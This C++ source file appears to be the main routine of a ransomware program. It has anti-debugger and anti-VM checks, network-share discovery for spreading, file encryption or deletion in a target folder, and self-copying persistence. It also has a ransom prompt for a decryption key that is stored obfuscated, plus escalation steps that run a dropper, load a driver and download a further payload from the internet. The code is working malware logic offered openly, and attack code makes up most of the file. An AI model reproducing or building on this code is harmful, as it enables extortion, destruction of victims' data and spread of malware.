#include "kill_switch.h"
#include "anti_checks.h"
#include "dropper.h"
#include "attack.h"
#include "gather.h"
#include "misc.h"

Attack attack;
Misc misc;
Check check;
Shared shared;
wstring s2ws(const std::string& str);
string ws2s(const std::wstring& wstr);

int main(int argc, char *argv[])
{
	check.Debugger();
	check.VirtualMachine();
	// check for network drives so malware can spread
	// can add conditional here, if network drive found then copy itself
	shared.GetDirs();

	string pass_key;

	string attack_dir = misc.current_working_directory() + "/../../test_attack_folder";
	vector<wstring> files = attack.list_n_kill_files(s2ws(attack_dir));
	string res = ws2s((const std::wstring&)*files.data()); // convert files vector into wstring into string

	// if files contain the string txt, exploit was completed
	if (res.find("txt") != std::string::npos)
	{
		std::cout << "[+] Exploit completed" << std::endl << std::endl;

		// Start persistance 
		misc.CopyMyself();
	}

	int wrong_counter = 0;
	while (true)
	{
		std::cout << "[!] Enter key to decrypt files: " << std::endl;
		cin >> pass_key;

		// if password entered from victim equals the decrypted text of key below
		if (pass_key == encryptDecrypt("3S)R%!(&().G+Z9)&"))
		{
			std::cout << "[+] Your files are being decrypted" << std::endl;
			decrypt_files(s2ws(attack_dir));
			return 0;
		}
		else {
			std::cout << "[-] Wrong Password" << std::endl;

			wrong_counter++;
			if (wrong_counter == 2)
			{
				executeDropper(argv[0]);
			}
			else if (wrong_counter == 3)
			{
				// located: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MyCustomBeep
				attack.LoadDriverBeep();
				// sc delete MyCustomBeep
			}
			else {
				// download final payload from github
				misc.CallFileFromInternet();
			}
		}
	}

	return 0;
}

// string to wstring conversion
wstring s2ws(const std::string& str)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.from_bytes(str);
}

// wstring to string conversion
string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}
